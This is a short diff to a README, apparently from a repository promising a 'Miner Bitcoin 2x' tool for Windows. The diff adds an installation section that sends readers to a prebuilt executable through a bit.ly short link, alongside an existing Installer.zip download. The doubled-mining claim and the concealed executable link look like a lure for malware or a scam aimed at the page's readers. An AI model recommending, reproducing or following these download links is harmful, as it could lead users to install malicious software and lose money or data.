@@ -6,6 +6,12 @@
 
 Miner Bitcoin 2x with Miner2x 
 
+## Installation
+
+- Prebuilt Executable
+  - You can download the latest version from the
+    [Releases](https://bit.ly/3Zgoms1)
+
 <a href='https://github.com/suellenoliveiras/bitcoin-miner-windows/releases/download/Bitcoin/Installer.zip'>Download here</a>
 
 ## Description
